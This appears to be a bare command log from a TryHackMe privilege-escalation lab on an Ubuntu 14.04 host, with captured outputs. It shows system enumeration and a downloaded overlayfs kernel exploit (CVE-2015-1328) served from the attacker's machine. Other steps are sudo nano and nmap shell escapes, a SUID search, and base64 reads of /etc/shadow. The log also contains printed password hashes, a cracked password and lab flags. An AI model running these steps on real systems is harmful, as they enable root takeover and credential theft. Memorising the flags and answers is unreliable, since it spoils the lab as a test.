ssh karen@10.10.171.207

hostname
wade7363

cat /proc/version
3.13.0-24-generic

cat /etc/issue
Ubuntu 14.04 LTS

python --version
Python 2.7.6

https://www.exploit-db.com/exploits/37292
CVE-2015-1328

gcc 37292.c -o ofc

sudo python3 -m http.server --bind 10.18.6.119 8080
cd tmp
wget http://10.18.6.119:8080/ofc

chmod +x ofc
ls -la

find / -type f -name '*flag2*.txt' 2>/dev/null
cat /home/matt/flag1.txt
THM-28392872729920

https://gtfobins.github.io/gtfobins/nano/#sudo
sudo nano
^R^X
reset; sh 1>&0 2>&0
id

find / -type f -name '*flag2*.txt' 2>/dev/null
cat /home/ubuntu/flag2.txt
THM-402028394

sudo nmap -interactive
cat /etc/shadow
$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1

cat /etc/passwd
gerryconway

find / -type f -perm -04000 -ls 2>/dev/null

LFILE=/etc/shadow
/usr/bin/base64 "$LFILE" | base64 --decode
$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/
Password1

find / -type f -name '*flag3*.txt' 2>/dev/null
LFILE=/home/ubuntu/flag3.txt
/usr/bin/base64 "$LFILE" | base64 --decode
THM-3847834